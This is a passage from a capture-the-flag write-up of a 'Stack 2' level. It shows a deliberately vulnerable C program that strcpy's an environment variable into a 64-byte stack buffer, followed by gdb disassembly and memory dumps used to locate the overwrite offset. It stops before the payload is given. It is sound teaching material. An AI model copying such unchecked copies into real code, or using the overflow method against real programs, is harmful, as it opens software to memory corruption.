## Stack 2

So for this stage we're given the following code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

Much like the last challenge we have to overwrite the modified variable with a specific value. However, instead of getting input directly from the user, we're using environment variables. 

```assembly
(gdb) disas main
Dump of assembler code for function main:
0x08048494 <main+0>:	push   %ebp
0x08048495 <main+1>:	mov    %esp,%ebp
0x08048497 <main+3>:	and    $0xfffffff0,%esp
0x0804849a <main+6>:	sub    $0x60,%esp
0x0804849d <main+9>:	movl   $0x80485e0,(%esp)
0x080484a4 <main+16>:	call   0x804837c <getenv@plt>
0x080484a9 <main+21>:	mov    %eax,0x5c(%esp)
0x080484ad <main+25>:	cmpl   $0x0,0x5c(%esp)
0x080484b2 <main+30>:	jne    0x80484c8 <main+52>
0x080484b4 <main+32>:	movl   $0x80485e8,0x4(%esp)
0x080484bc <main+40>:	movl   $0x1,(%esp)
0x080484c3 <main+47>:	call   0x80483bc <errx@plt>
0x080484c8 <main+52>:	movl   $0x0,0x58(%esp)
0x080484d0 <main+60>:	mov    0x5c(%esp),%eax
0x080484d4 <main+64>:	mov    %eax,0x4(%esp)
0x080484d8 <main+68>:	lea    0x18(%esp),%eax
0x080484dc <main+72>:	mov    %eax,(%esp)
0x080484df <main+75>:	call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:	mov    0x58(%esp),%eax
0x080484e8 <main+84>:	cmp    $0xd0a0d0a,%eax
0x080484ed <main+89>:	jne    0x80484fd <main+105>
0x080484ef <main+91>:	movl   $0x8048618,(%esp)
0x080484f6 <main+98>:	call   0x80483cc <puts@plt>
0x080484fb <main+103>:	jmp    0x8048512 <main+126>
0x080484fd <main+105>:	mov    0x58(%esp),%edx
0x08048501 <main+109>:	mov    $0x8048641,%eax
0x08048506 <main+114>:	mov    %edx,0x4(%esp)
0x0804850a <main+118>:	mov    %eax,(%esp)
0x0804850d <main+121>:	call   0x80483ac <printf@plt>
0x08048512 <main+126>:	leave  
0x08048513 <main+127>:	ret    
```
The assembly dumps just gets longer and longer. Luckily, we can cut out a big chunk of out:

####ignore
```assembly
(gdb) disas main
Dump of assembler code for function main:
0x08048494 <main+0>:    push   %ebp
0x08048495 <main+1>:    mov    %esp,%ebp
0x08048497 <main+3>:    and    $0xfffffff0,%esp
0x0804849a <main+6>:    sub    $0x60,%esp
0x0804849d <main+9>:    movl   $0x80485e0,(%esp)
0x080484a4 <main+16>:   call   0x804837c <getenv@plt>
0x080484a9 <main+21>:   mov    %eax,0x5c(%esp)
0x080484ad <main+25>:   cmpl   $0x0,0x5c(%esp)
0x080484b2 <main+30>:   jne    0x80484c8 <main+52>
0x080484b4 <main+32>:   movl   $0x80485e8,0x4(%esp)
0x080484bc <main+40>:   movl   $0x1,(%esp)
0x080484c3 <main+47>:   call   0x80483bc <errx@plt>
```

The code above basically sets up the stack and checks to make sure there's an environment variable named "GREENIE". The code we want to look at is below.

```assembly
0x080484c8 <main+52>:	movl   $0x0,0x58(%esp)
0x080484d0 <main+60>:	mov    0x5c(%esp),%eax
0x080484d4 <main+64>:	mov    %eax,0x4(%esp)
0x080484d8 <main+68>:	lea    0x18(%esp),%eax
0x080484dc <main+72>:	mov    %eax,(%esp)
0x080484df <main+75>:	call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:	mov    0x58(%esp),%eax
0x080484e8 <main+84>:	cmp    $0xd0a0d0a,%eax
0x080484ed <main+89>:	jne    0x80484fd <main+105>
0x080484ef <main+91>:	movl   $0x8048618,(%esp)
0x080484f6 <main+98>:	call   0x80483cc <puts@plt>
0x080484fb <main+103>:	jmp    0x8048512 <main+126>
0x080484fd <main+105>:	mov    0x58(%esp),%edx
0x08048501 <main+109>:	mov    $0x8048641,%eax
0x08048506 <main+114>:	mov    %edx,0x4(%esp)
0x0804850a <main+118>:	mov    %eax,(%esp)
0x0804850d <main+121>:	call   0x80483ac <printf@plt>
0x08048512 <main+126>:	leave  
0x08048513 <main+127>:	ret    
```

First we set modified to 0 ```0x080484c8 <main+52>:	movl   $0x0,0x58(%esp)``` then we setup where the value of GREENIE will be coppied into ```0x080484d8 <main+68>:	lea    0x18(%esp),%eax```. Let's look at those addresses.

#### modified variable
```assembly
(gdb) x/i $eip
0x80484c8 <main+52>:	movl   $0x0,0x58(%esp)
(gdb) x/10x $esp + 0x58
0xbffff778:	0x0804853b	0xbffff9f8	0x08048530	0x00000000
0xbffff788:	0xbffff808	0xb7eadc76	0x00000001	0xbffff834
0xbffff798:	0xbffff83c	0xb7fe1848
(gdb) si
(gdb) x/10x $esp + 0x58
0xbffff778:	0x00000000	0xbffff9f8	0x08048530	0x00000000
0xbffff788:	0xbffff808	0xb7eadc76	0x00000001	0xbffff834
0xbffff798:	0xbffff83c	0xb7fe1848
```
#### buffer
```assembly
(gdb) x/i $eip
0x80484d8 <main+68>:	lea    0x18(%esp),%eax
(gdb) x/10x $esp + 0x18
0xbffff738:	0xbffff748	0xb7eada75	0xb7fd7ff4	0x08049748
0xbffff748:	0xbffff758	0x08048358	0xb7ff1040	0x08049748
0xbffff758:	0xbffff788	0x08048549
(gdb) c
(gdb) x/10x $esp + 0x18
0xbffff738:	0x61616161	0x61616161	0x61616161	0x00616161
0xbffff748:	0xbffff758	0x08048358	0xb7ff1040	0x08049748
0xbffff758:	0xbffff788	0x08048549
```

So modified will be stored at 0xbffff778 and buffer will start at 0xbffff738, 0xbffff778 - 0xbffff738 = 64 + 4 to overwrite the value. So we need to set the GREENIE envrionment variable to 
